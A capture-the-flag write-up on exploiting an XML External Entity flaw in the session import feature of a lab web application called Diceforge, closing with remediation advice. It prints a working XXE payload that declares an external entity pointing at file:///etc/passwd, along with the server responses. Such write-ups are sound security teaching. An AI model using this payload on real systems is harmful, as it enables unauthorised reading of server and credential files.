# Diceforge - dice-005 - Import your previous sessions.

## Challenge Overview

- **Platform:** Bugforge
- **Challenge:** Diceforge
- **Category:** Web Security
- **Vulnerability:** XML External Entity (XXE) Injection
- **Difficulty:** As assigned by the platform
- **Status:** Solved

### Hint

> Import your previous sessions.

The hint suggested investigating the session import functionality and examining how the application processes previously exported XML files.

---

## 1. Initial Reconnaissance

After opening the Diceforge web application, I navigated to the **Rooms** page. The application provided three main options:

1. Create a new room by entering a room name.
2. Join an existing room using a room code.
3. Import a session by uploading an exported XML file.

The session import functionality appeared to be a promising attack surface because the server needed to process user-supplied XML.

### Initial hypothesis

The XML parser might process external entity declarations without sufficient security restrictions, potentially allowing XML External Entity (XXE) injection.

This was a hypothesis that needed to be verified through testing.

---

## 2. Creating and Exporting a Session

To understand the expected XML format, I created a room named `TEST`.

I then entered the player name `Test`, added a die, and clicked **Roll to Room** to generate a dice-roll record. Finally, I exported the session to inspect its contents.

### Exported XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<session>
    <name>TEST</name>
    <rolls>
        <roll>
            <player>Test</player>
            <notation>1d6</notation>
            <total>4</total>
        </roll>
    </rolls>
</session>
```

### XML structure

| Element | Purpose |
|---|---|
| `session` | Root element containing the session data |
| `name` | Session or room name |
| `rolls` | Container for dice-roll records |
| `roll` | Individual dice-roll record |
| `player` | Player associated with the roll |
| `notation` | Dice notation, such as `1d6` |
| `total` | Recorded dice-roll total |

This export established the baseline document structure required by the import endpoint.

---

## 3. Identifying the Import Endpoint

I opened the browser's Developer Tools and selected the **Network** tab. After importing an XML file, I inspected the corresponding HTTP request.

The endpoint was:

```http
POST /api/rooms/import
```

The full lab URL was:

```text
https://lab-1792056804304-jw0lc6.labs-app.bugforge.io/api/rooms/import
```

The request used the following content type:

```http
Content-Type: application/xml
```

This confirmed that the application accepted XML directly through an HTTP request.

---

## 4. Testing XML Entity Processing

### Initial internal entity test

I first attempted to define an internal XML entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE session [
    <!ENTITY test "XXE_TEST_123">
]>
<session>
    <name>&test;</name>
    <rolls>
        <roll>
            <player>Test</player>
            <notation>1d6</notation>
            <total>4</total>
        </roll>
    </rolls>
</session>
```

The server returned:

```http
HTTP/2 400 Bad Request
```

Response:

```json
{"error":"Invalid XML session"}
```

This attempt failed. The response did not reveal whether the cause was entity handling, XML parsing, or session validation.

### External entity test

Next, I tested an external entity referencing a local file on the challenge server.

The XML payload was:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE session [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<session>
    <name>&xxe;</name>
    <rolls>
        <roll>
            <player>Test</player>
            <notation>1d6</notation>
            <total>4</total>
        </roll>
    </rolls>
</session>
```

The important parts of the payload were:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

This declared an external entity named `xxe` that referenced a local filesystem resource.

The entity was then referenced inside the session name:

```xml
<name>&xxe;</name>
```

The purpose was to determine whether the server's XML parser would resolve the external entity while importing the session.

---

## 5. Successful Exploitation

The server accepted the external-entity payload and returned:

```http
HTTP/2 201 Created
```

The response body was:

```json
{
    "id": "528085a401ca",
    "name": "Imported local resource",
    "createdAt": "2026-10-15T09:57:04.955Z",
    "rolls": [
        {
            "player": "Test",
            "notation": "1d6",
            "results": [],
            "grandTotal": 4,
            "timestamp": "2026-10-15T09:57:04.955Z"
        }
    ],
    "flag": "bug{qnwNu5onTJAwlB7QiTxka2WKAUyDlGhs}"
}
```

The server created the imported session and disclosed the challenge flag in the response.

The changed session name, `Imported local resource`, was consistent with the application's handling of the external resource. However, the response did not display the contents of `/etc/passwd`, so direct file-content disclosure was not independently confirmed.

### Captured flag

```text
bug{qnwNu5onTJAwlB7QiTxka2WKAUyDlGhs}
```

**Result:** The challenge was solved, and the flag was obtained.

---

## 6. Understanding the Vulnerability

XML External Entity (XXE) injection occurs when an application processes attacker-controlled XML and allows external entity resolution without appropriate restrictions.

In this challenge, the relevant sequence was:

1. The application accepted a user-supplied XML session.
2. The document declared an external entity referencing a local file.
3. The XML document referenced that entity in the session name.
4. The import request succeeded with HTTP status `201`.
5. The response included the challenge flag.

The result indicates that the XML import feature has an insecure processing path consistent with the intended XXE vulnerability.

The exact XML parser, its configuration, and the internal mechanism responsible for returning the flag were not identified during this investigation.

---

## 7. Impact

Depending on the XML parser configuration and the application's permissions, an XXE vulnerability may allow an attacker to:

- Read files accessible to the application process.
- Access sensitive configuration files or credentials.
- Make server-side requests to internal services if other URI schemes and network access are permitted.
- Cause denial of service through unsafe XML processing configurations.

These are potential impacts of XXE generally; they were not all demonstrated in this challenge.

In Diceforge, the confirmed outcome was a successful import response containing the challenge flag.

---

## 8. Remediation

Developers should apply the following protections to XML import functionality.

### Disable external entity resolution

Configure the XML parser to disable external general entities, external parameter entities, and external DTD loading.

### Disable DTD processing when unnecessary

If the application does not require DTDs, reject documents containing `DOCTYPE` declarations.

### Use a secure XML parser configuration

Use a maintained parser with secure defaults and explicitly configure its security settings rather than relying on implicit defaults.

### Validate imported session data

Validate the parsed session against a strict schema and enforce expected types, lengths, and allowed values for fields such as session names, player names, dice notation, and totals.

Schema validation is an additional safeguard; it does not replace disabling unsafe entity resolution.

### Apply least privilege

Ensure that the application process has only the filesystem and network permissions it needs.

### Avoid exposing sensitive information

Return generic import errors to clients and avoid placing secrets or internal diagnostic data in API responses.

---

## 9. Lessons Learned

- Challenge hints can point toward important application features.
- Exporting a valid session reveals the expected input format.
- Browser Developer Tools can identify endpoints, request methods, headers, and response bodies.
- A failed test with a generic error does not necessarily identify the underlying cause.
- Controlled comparisons help distinguish input validation failures from parser behavior.
- Successful XML import alone does not prove XXE; evidence of unsafe external entity processing is needed.
- A successful challenge should be documented with the payload, HTTP response, flag, and limitations of the observed evidence.

---

## 10. Conclusion

The Diceforge challenge involved investigating an XML-based session import feature. After creating and exporting a legitimate session, I identified the `POST /api/rooms/import` endpoint and tested how it handled XML entity declarations.

An initial internal entity payload was rejected. A subsequent external entity payload referencing `file:///etc/passwd` was accepted, and the application returned a successful session-import response containing the challenge flag.

This investigation demonstrated the importance of securing XML parsers against unsafe external entity resolution and validating all imported data.

**Challenge status: Solved.**